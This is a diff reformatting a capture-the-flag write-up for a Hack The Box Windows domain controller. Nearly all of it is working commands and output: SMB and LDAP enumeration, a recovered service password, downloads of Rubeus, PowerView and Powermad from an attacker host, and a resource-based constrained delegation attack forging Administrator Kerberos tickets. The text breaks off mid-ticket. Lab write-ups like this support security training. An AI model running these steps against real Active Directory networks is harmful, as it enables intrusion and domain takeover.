@@ -20,335 +20,335 @@ Rubeus
 
 --------------------------------------------------Exploit--------------------------------------------------
 * User-Flag:
-- Scan full port with nmap => many ports open but SMB is the first thing have to investigate then LDAP and KERBEROS
+	- Scan full port with nmap => many ports open but SMB is the first thing have to investigate then LDAP and KERBEROS
 
-- Using nmap to scan default user or bruce-force user: 
-	nmap -p 88 -Pn --script krb5-enum-users --script-args krb5-enum-users.realm='support.htb' 10.10.11.174 
-	(nmap -p 88 -Pn --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP})
-	PORT   STATE SERVICE
-	88/tcp open  kerberos-sec
-	| krb5-enum-users:
-	| Discovered Kerberos principals
-	|     administrator@support.htb
-	|_    guest@support.htb
+	- Using nmap to scan default user or bruce-force user: 
+		nmap -p 88 -Pn --script krb5-enum-users --script-args krb5-enum-users.realm='support.htb' 10.10.11.174 
+		(nmap -p 88 -Pn --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP})
+		PORT   STATE SERVICE
+		88/tcp open  kerberos-sec
+		| krb5-enum-users:
+		| Discovered Kerberos principals
+		|     administrator@support.htb
+		|_    guest@support.htb
 
-- Using smbmap or crackmapexec to check share file of guest user:
-	smbmap -u "guest" -p "" -P 445 -H support.htb
-	[+] IP: support.htb:445 Name: unknown
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        C$                                                      NO ACCESS       Default share
-        IPC$                                                    READ ONLY       Remote IPC
-        NETLOGON                                                NO ACCESS       Logon server share
-        support-tools                                           READ ONLY       support staff tools
-        SYSVOL                                                  NO ACCESS       Logon server share
+	- Using smbmap or crackmapexec to check share file of guest user:
+		smbmap -u "guest" -p "" -P 445 -H support.htb
+		[+] IP: support.htb:445 Name: unknown
+			Disk                                                    Permissions     Comment
+			----                                                    -----------     -------
+			ADMIN$                                                  NO ACCESS       Remote Admin
+			C$                                                      NO ACCESS       Default share
+			IPC$                                                    READ ONLY       Remote IPC
+			NETLOGON                                                NO ACCESS       Logon server share
+			support-tools                                           READ ONLY       support staff tools
+			SYSVOL                                                  NO ACCESS       Logon server share
 
-	crackmapexec smb -u guest -p '' --shares support.htb
-	SMB         dc.support.htb  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
-	SMB         dc.support.htb  445    DC               [+] support.htb\guest:
-	SMB         dc.support.htb  445    DC               [+] Enumerated shares
-	SMB         dc.support.htb  445    DC               Share           Permissions     Remark
-	SMB         dc.support.htb  445    DC               -----           -----------     ------
-	SMB         dc.support.htb  445    DC               ADMIN$                          Remote Admin
-	SMB         dc.support.htb  445    DC               C$                              Default share
-	SMB         dc.support.htb  445    DC               IPC$            READ            Remote IPC
-	SMB         dc.support.htb  445    DC               NETLOGON                        Logon server share
-	SMB         dc.support.htb  445    DC               support-tools   READ            support staff tools
-	SMB         dc.support.htb  445    DC               SYSVOL                          Logon server share
+		crackmapexec smb -u guest -p '' --shares support.htb
+		SMB         dc.support.htb  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+		SMB         dc.support.htb  445    DC               [+] support.htb\guest:
+		SMB         dc.support.htb  445    DC               [+] Enumerated shares
+		SMB         dc.support.htb  445    DC               Share           Permissions     Remark
+		SMB         dc.support.htb  445    DC               -----           -----------     ------
+		SMB         dc.support.htb  445    DC               ADMIN$                          Remote Admin
+		SMB         dc.support.htb  445    DC               C$                              Default share
+		SMB         dc.support.htb  445    DC               IPC$            READ            Remote IPC
+		SMB         dc.support.htb  445    DC               NETLOGON                        Logon server share
+		SMB         dc.support.htb  445    DC               support-tools   READ            support staff tools
+		SMB         dc.support.htb  445    DC               SYSVOL                          Logon server share
 
-- Using smbclient to authen as guest and navigate all readable folder:
-	smbclient '//10.10.11.174/support-tools' -U 'guest' -W 'support' -l '10.10.11.174'
-	[2022/11/13 23:49:28,  0] ../../lib/util/debug.c:1224(reopen_one_log)
-	  reopen_one_log: Unable to open new log file '10.10.11.174/log.smbclient': No such file or directory
-	Password for [SUPPORT\guest]:
-	Try "help" to get a list of possible commands.
-	smb: \> ls
-	  .                                   D        0  Wed Jul 20 13:01:06 2022
-	  ..                                  D        0  Sat May 28 07:18:25 2022
-	  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
-	  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
-	  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
-	  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
-	  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
-	  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
-	  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+	- Using smbclient to authen as guest and navigate all readable folder:
+		smbclient '//10.10.11.174/support-tools' -U 'guest' -W 'support' -l '10.10.11.174'
+		[2022/11/13 23:49:28,  0] ../../lib/util/debug.c:1224(reopen_one_log)
+		  reopen_one_log: Unable to open new log file '10.10.11.174/log.smbclient': No such file or directory
+		Password for [SUPPORT\guest]:
+		Try "help" to get a list of possible commands.
+		smb: \> ls
+		  .                                   D        0  Wed Jul 20 13:01:06 2022
+		  ..                                  D        0  Sat May 28 07:18:25 2022
+		  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+		  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+		  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+		  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+		  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+		  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+		  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
 
-					4026367 blocks of size 4096. 965451 blocks available
+						4026367 blocks of size 4096. 965451 blocks available
 
-- Download all the content using:
-	smb: \> prompt
-	smb: \> mget *
+	- Download all the content using:
+		smb: \> prompt
+		smb: \> mget *
 
-- chmod and unzip evry things and take a look of every things
+	- chmod and unzip evry things and take a look of every things
 
-- Run UserInfo.exe and get other information => there may be query inside the app => there may be credential to login in oder to query
+	- Run UserInfo.exe and get other information => there may be query inside the app => there may be credential to login in oder to query
 
-- Use dnspy to Reverse and get valid user name and password of support/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+	- Use dnspy to Reverse and get valid user name and password of support/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 
-- Use ldapdomaindump tool to dump ldap db:
-	ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -at SIMPLE --no-json --no-grep -o /home/kali/htb/support.htb/ldapdump support.htb
+	- Use ldapdomaindump tool to dump ldap db:
+		ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -at SIMPLE --no-json --no-grep -o /home/kali/htb/support.htb/ldapdump support.htb
 
-- Use ldapsearch to query all user name:
-	ldapsearch -v -x -b "DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" "sAMAccountName" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep sAMAccountName
+	- Use ldapsearch to query all user name:
+		ldapsearch -v -x -b "DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" "sAMAccountName" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep sAMAccountName
 
-- Use ldapsearch to get data of specific user infomation:
-	ldapsearch -v -x -b "CN=support,CN=Users,DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
-	
-- Horizontal privilege escalation success:
-	support:Ironside47pleasure40Watchful
-	
-- RCE with evil-winrm and get user flag:
-	evil-winrm -i 10.10.11.174 -u support
-	Ironside47pleasure40Watchful
+	- Use ldapsearch to get data of specific user infomation:
+		ldapsearch -v -x -b "CN=support,CN=Users,DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+		
+	- Horizontal privilege escalation success:
+		support:Ironside47pleasure40Watchful
+		
+	- RCE with evil-winrm and get user flag:
+		evil-winrm -i 10.10.11.174 -u support
+		Ironside47pleasure40Watchful
 
 * Root-Flag:
-- Check user, group, system information:
-	$Env:PROCESSOR_ARCHITECTURE
-	$Env:PROCESSOR_IDENTIFIER
-	Get-ADPrincipalGroupMembership support | select name
-	[Environment]::OSVersion
-	Get-ComputerInfo
-	get-domainuser |select -first 1
-	get-domainobject -identity "DC=support,DC=htb"
-	get-domaincontroller
-- Download nessesary tools:
-	Invoke-WebRequest -Uri http://10.10.16.16:8000/winPEASx64_ofs.exe -OutFile winPEASx64_ofs.exe 
-	Invoke-WebRequest -Uri http://10.10.16.16:8000/Powermad.ps1 -OutFile Powermad.ps1
-	Invoke-WebRequest -Uri http://10.10.16.16:8000/PowerView.ps1 -OutFile PowerView.ps1
-- Import tools and get more information:
-	Import-Module .\Powermad.ps1
-	Import-Module .\PowerView.ps1
-	get-domainuser |select -first 1
-	get-domainobject -identity "DC=support,DC=htb"
-	get-domaincontroller
-- Check require condition for Resource-Based Constrained Delegation:
-	Get-ADObject -Identity "dc.support.htb" -Properties MS-DS-MachineAccountQuota
-	ms-ds-machineaccountquota                   : 10
-	
-	get-domaincomputer dc | select name.msds-allowedtoactonbehalfofotheridentity | fl
-	name.msds-allowedtoactonbehalfofotheridentity :
+	- Check user, group, system information:
+		$Env:PROCESSOR_ARCHITECTURE
+		$Env:PROCESSOR_IDENTIFIER
+		Get-ADPrincipalGroupMembership support | select name
+		[Environment]::OSVersion
+		Get-ComputerInfo
+		get-domainuser |select -first 1
+		get-domainobject -identity "DC=support,DC=htb"
+		get-domaincontroller
+	- Download nessesary tools:
+		Invoke-WebRequest -Uri http://10.10.16.16:8000/winPEASx64_ofs.exe -OutFile winPEASx64_ofs.exe 
+		Invoke-WebRequest -Uri http://10.10.16.16:8000/Powermad.ps1 -OutFile Powermad.ps1
+		Invoke-WebRequest -Uri http://10.10.16.16:8000/PowerView.ps1 -OutFile PowerView.ps1
+	- Import tools and get more information:
+		Import-Module .\Powermad.ps1
+		Import-Module .\PowerView.ps1
+		get-domainuser |select -first 1
+		get-domainobject -identity "DC=support,DC=htb"
+		get-domaincontroller
+	- Check require condition for Resource-Based Constrained Delegation:
+		Get-ADObject -Identity "dc.support.htb" -Properties MS-DS-MachineAccountQuota
+		ms-ds-machineaccountquota                   : 10
+		
+		get-domaincomputer dc | select name.msds-allowedtoactonbehalfofotheridentity | fl
+		name.msds-allowedtoactonbehalfofotheridentity :
 
-- Exploit:
-	[Environment]::OSVersion
-	Get-ComputerInfo
+	- Exploit:
+		[Environment]::OSVersion
+		Get-ComputerInfo
 
-	get-domainuser |select -first 1
-	get-domainobject -identity "DC=support,DC=htb"
-	get-domaincontroller
+		get-domainuser |select -first 1
+		get-domainobject -identity "DC=support,DC=htb"
+		get-domaincontroller
 
-	hostname
-	dc
-	$TargetComputer = "dc.support.htb"
+		hostname
+		dc
+		$TargetComputer = "dc.support.htb"
 
-	Get-DomainUser support -Properties objectsid | Select -Expand objectsid
-	S-1-5-21-1677581083-3380853377-188903654-1105
-	$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid
+		Get-DomainUser support -Properties objectsid | Select -Expand objectsid
+		S-1-5-21-1677581083-3380853377-188903654-1105
+		$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid
 
-	Get-ADObject -Identity $TargetComputer -Properties MS-DS-MachineAccountQuota
-	ms-ds-machineaccountquota                   : 10
+		Get-ADObject -Identity $TargetComputer -Properties MS-DS-MachineAccountQuota
+		ms-ds-machineaccountquota                   : 10
 
-	get-domaincomputer dc
-	get-domaincomputer dc | select name.msds-allowedtoactonbehalfofotheridentity | fl
-	name.msds-allowedtoactonbehalfofotheridentity :
+		get-domaincomputer dc
+		get-domaincomputer dc | select name.msds-allowedtoactonbehalfofotheridentity | fl
+		name.msds-allowedtoactonbehalfofotheridentity :
 
-	New-MachineAccount -MachineAccount FakeComputer01 -Password $(ConvertTo-SecureString 'FakeComputer01' -AsPlainText -Force)
-	[+] Machine account FakeComputer01 added
+		New-MachineAccount -MachineAccount FakeComputer01 -Password $(ConvertTo-SecureString 'FakeComputer01' -AsPlainText -Force)
+		[+] Machine account FakeComputer01 added
 
-	get-domaincomputer FakeComputer01 | Select -Expand objectsid
-	objectsid              : S-1-5-21-1677581083-3380853377-188903654-5103
+		get-domaincomputer FakeComputer01 | Select -Expand objectsid
+		objectsid              : S-1-5-21-1677581083-3380853377-188903654-5103
 
-	get-domaincomputer FakeComputer01 | select name.msds-allowedtoactonbehalfofotheridentity | fl
-	name.msds-allowedtoactonbehalfofotheridentity :
+		get-domaincomputer FakeComputer01 | select name.msds-allowedtoactonbehalfofotheridentity | fl
+		name.msds-allowedtoactonbehalfofotheridentity :
 
-	$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
-	$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)"
-	$SDBytes = New-Object byte[] ($SD.BinaryLength)
-	$SD.GetBinaryForm($SDBytes, 0)
+		$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+		$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)"
+		$SDBytes = New-Object byte[] ($SD.BinaryLength)
+		$SD.GetBinaryForm($SDBytes, 0)
 
-	Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-	Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-
-
-	Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
-	$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
-	$Descriptor.DiscretionaryAcl
-
-	BinaryLength       : 36
-	AceQualifier       : AccessAllowed
-	IsCallback         : False
-	OpaqueLength       : 0
-	AccessMask         : 983551
-	SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5103
-	AceType            : AccessAllowed
-	AceFlags           : None
-	IsInherited        : False
-	InheritanceFlags   : None
-	PropagationFlags   : None
-	AuditFlags         : None
-
-	------------------------------------------------------------------------------------------------------------------------------------------
-	.\Rubeus.exe hash /password:FakeComputer01 /user:FakeComputer01 /domain:support.htb
-
-	   ______        _
-	  (_____ \      | |
-	   _____) )_   _| |__  _____ _   _  ___
-	  |  __  /| | | |  _ \| ___ | | | |/___)
-	  | |  \ \| |_| | |_) ) ____| |_| |___ |
-	  |_|   |_|____/|____/|_____)____/(___/
-
-	  v2.2.0
+		Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+		Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
 
-	[*] Action: Calculate Password Hash(es)
+		Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+		$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+		$Descriptor.DiscretionaryAcl
 
-	[*] Input password             : FakeComputer01
-	[*] Input username             : FakeComputer01
-	[*] Input domain               : support.htb
-	[*] Salt                       : SUPPORT.HTBFakeComputer01
-	[*]       rc4_hmac             : A8061F769DDD61A1A517FB6EFC3F1D8A
-	[*]       aes128_cts_hmac_sha1 : 89A515F5DB3CC3205F5A0FEB82046303
-	[*]       aes256_cts_hmac_sha1 : 577BBA51C1FB5F2175BECC9413AAECC1C463DE1F0ED4AA36CFBA7377297E31AB
-	[*]       des_cbc_md5          : 62F7E05B23AE75A2
+		BinaryLength       : 36
+		AceQualifier       : AccessAllowed
+		IsCallback         : False
+		OpaqueLength       : 0
+		AccessMask         : 983551
+		SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5103
+		AceType            : AccessAllowed
+		AceFlags           : None
+		IsInherited        : False
+		InheritanceFlags   : None
+		PropagationFlags   : None
+		AuditFlags         : None
 
-	Rubeus.exe
-	Rubeus.exe.config
-	Rubeus.pdb
+		------------------------------------------------------------------------------------------------------------------------------------------
+		.\Rubeus.exe hash /password:FakeComputer01 /user:FakeComputer01 /domain:support.htb
 
-	Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.exe -OutFile Rubeus.exe
-	Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.exe.config -OutFile Rubeus.exe.config
-	Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.pdb -OutFile Rubeus.pdb
+		   ______        _
+		  (_____ \      | |
+		   _____) )_   _| |__  _____ _   _  ___
+		  |  __  /| | | |  _ \| ___ | | | |/___)
+		  | |  \ \| |_| | |_) ) ____| |_| |___ |
+		  |_|   |_|____/|____/|_____)____/(___/
 
-
-	.\Rubeus.exe s4u /user:FakeComputer01$ /rc4:A8061F769DDD61A1A517FB6EFC3F1D8A /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
-
-
-	   ______        _
-	  (_____ \      | |
-	   _____) )_   _| |__  _____ _   _  ___
-	  |  __  /| | | |  _ \| ___ | | | |/___)
-	  | |  \ \| |_| | |_) ) ____| |_| |___ |
-	  |_|   |_|____/|____/|_____)____/(___/
-
-	  v2.2.0
-
-	[*] Action: S4U
-
-	[*] Using rc4_hmac hash: A8061F769DDD61A1A517FB6EFC3F1D8A
-	[*] Building AS-REQ (w/ preauth) for: 'support.htb\FakeComputer01$'
-	[*] Using domain controller: ::1:88
-	[+] TGT request successful!
-	[*] base64(ticket.kirbi):
-
-		  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
-		  cnQuaHRi
+		  v2.2.0
 
 
-	[*] Action: S4U
+		[*] Action: Calculate Password Hash(es)
 
-	[*] Building S4U2self request for: 'FakeComputer01$@SUPPORT.HTB'
-	[*] Using domain controller: dc.support.htb (::1)
-	[*] Sending S4U2self request to ::1:88
-	[+] S4U2self success!
-	[*] Got a TGS for 'administrator' to 'FakeComputer01$@SUPPORT.HTB'
-	[*] base64(ticket.kirbi):
+		[*] Input password             : FakeComputer01
+		[*] Input username             : FakeComputer01
+		[*] Input domain               : support.htb
+		[*] Salt                       : SUPPORT.HTBFakeComputer01
+		[*]       rc4_hmac             : A8061F769DDD61A1A517FB6EFC3F1D8A
+		[*]       aes128_cts_hmac_sha1 : 89A515F5DB3CC3205F5A0FEB82046303
+		[*]       aes256_cts_hmac_sha1 : 577BBA51C1FB5F2175BECC9413AAECC1C463DE1F0ED4AA36CFBA7377297E31AB
+		[*]       des_cbc_md5          : 62F7E05B23AE75A2
 
-		  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
-		  AaETMBEbD0Zha2VDb21wdXRlcjAxJA==
+		Rubeus.exe
+		Rubeus.exe.config
+		Rubeus.pdb
 
-	[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
-	[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
-	[*] Using domain controller: dc.support.htb (::1)
-	[*] Sending S4U2proxy request to domain controller ::1:88
-	[+] S4U2proxy success!
-	[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
-
-		  doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
-		  AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQWiggUpBIIFJQ9D9cbW
-		  8ztjY+zPJaF0iAQW/EsJNkbWjM5eRyhqBVpIpqFKbDtN40pFOrQDEqc08WFMuJz9WPu1NyyU8VGgCkwX
-		  9QuY39g9XfQERrrfx8KLKk0jRgDHynh+1X3qFs4U9OsoZk8/dQ5CxBgSoU9g8IjWX7uH+rTGgyR4P32z
-		  y7LtQRiRbKeYqD6tDtHADuJx1qwO1twB/ZF4grd/RzSylAYl5XSPAPVaKyDZeLzDIkrdbfRSMlbGEbvg
-		  yOczyyaHHc09KDUwrTc6CCpVE5NJ425dhUkkxsAN5tekXnIy9v+GEvHUPHZ/ZDZ+P0SA0O83mB6bG6Wf
-		  v06FAIA1+rszEep/BXAdUhQHYvnOxcjDQlEJFpTt8HcJMKPIyD4PIuNysArLkifAUeeeU6UDMuiij76x
-		  zBVw6P+4dha9zJCgIB5u6Hi0XgbnW0OE7eOWkIrI63occf1cZEWeTth8TVMAEAjeLjudvQZqumo9LnVV
-		  nVKl4+tF4Emep863aJ5f3Yd8OTxLKLsx9MWDNPliYjF3OCQkiBibrcaHcipvMnu4wODhQgoXx60Dk2KT
-		  BNTrM+YOxCzXpTy5J3Bm6XNrAwd6JhXrAGIZrEXjTRkaLyFjQEspW04v+aoOJV0sLOBpg6Mw94UigXd+
-		  v6vKSTp65wzmq9yXqXI+LUj0RfJxuJjRZdMms3vUcz56Vec3al9X6GMNUg+rfh9E0soN1rckErW7tt7W
-		  HDUXLjGikzxhwKM2GhcE4A3ud86pymUXhc9RZ8YtIaJo+11kMtHcI/WllzKmbU27baB7IuV1blGhCyYd
